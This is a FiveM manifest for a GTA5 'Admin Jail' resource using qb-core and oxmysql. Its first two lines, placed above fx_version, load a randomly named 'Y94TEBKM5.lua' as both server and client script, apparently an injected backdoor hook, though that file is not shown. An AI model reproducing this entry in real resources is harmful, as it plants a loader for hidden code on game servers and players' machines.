server_script "Y94TEBKM5.lua"
client_script "Y94TEBKM5.lua"
fx_version 'adamant'

version '1.0.0'

game 'gta5'
description 'Admin Jail For Admins By Eilay#6969'

client_script 'client/main.lua'

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	-- '@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server/main.lua'
}

shared_script {
    '@qb-core/shared/locale.lua',
    'config.lua',
    'locales/en.lua',
    'locales/*.lua',
    'shared/shared.lua',
}